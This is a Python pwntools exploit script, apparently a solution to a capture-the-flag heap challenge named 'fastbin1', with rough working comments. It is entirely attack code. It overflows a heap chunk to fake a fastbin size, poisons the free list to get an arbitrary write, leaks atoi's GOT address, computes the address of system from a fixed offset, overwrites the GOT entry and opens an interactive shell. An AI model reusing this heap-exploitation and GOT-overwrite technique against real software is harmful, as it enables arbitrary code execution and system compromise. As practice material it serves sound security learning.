from pwn import *
p = process("./fastbin1")
#gdb.attach(p)

atoi_plt = 0x00000000004006f0
atoi_got = 0x602060

#diff = 0xe510
print(p.recvuntil("Enter name:"))
print(p.sendline("a"*56+p64(0x41)))

#1st malloc
print(p.recvuntil("Enter choice >>"))
print(p.sendline("1"))
print(p.recvuntil("Enter index :"))
print(p.sendline("0")) #
print(p.sendline("0"))

#2nd malloc -- to get them cntns
print(p.recvuntil("Enter choice >>"))
print(p.sendline("1"))
print(p.recvuntil("Enter index :"))
print(p.sendline("1")) #
print(p.sendline("1"))

#free of one 
print(p.recvuntil("Enter choice >>"))
print(p.sendline("4"))
print(p.recvuntil("Enter index :"))
print(p.sendline("1")) #


#calling edit function to overwrite
print(p.recvuntil("Enter choice >>"))
print(p.sendline("2"))
print(p.recvuntil("Enter index :"))
print(p.sendline("0"))
#ig this one is beg of puts addr figure out 
#print(p.sendline('a'*40+p64(0x41)+p64(0x6020d0)))
print(p.sendline('a'*56+p64(0x41)+p64(0x6020d0)))
#calling malloc again to get the rew addr


print(p.recvuntil("Enter choice >>"))
print(p.sendline("1"))
print(p.recvuntil("Enter index :"))
print(p.sendline("1")) #
print(p.sendline("2"))


print(p.recvuntil("Enter choice >>"))
print(p.sendline("1"))
print(p.recvuntil("Enter index :"))
print(p.sendline("2")) #
print(p.sendline(p64(atoi_got)))


print(p.recvuntil("Enter choice >>"))
print(p.sendline("3"))
print(p.recvuntil("Enter index :"))
print(p.sendline("0"))
print(p.recvuntil("Data: "))
leak = p.recvline().strip()+'\x00'*2
print("llo")
leak = u64(leak)
#leak=u64(leak)

sys = leak+0xe510

print(p.sendlineafter("Enter choice >>",'2'))
print(p.sendlineafter("Enter index :",'0'))
print(p.sendline(p64(sys)))
p.interactive()


#p.interactive()

#check whether if edit fn is called what is being overwritten... how to pass the GOT addr to overwrite
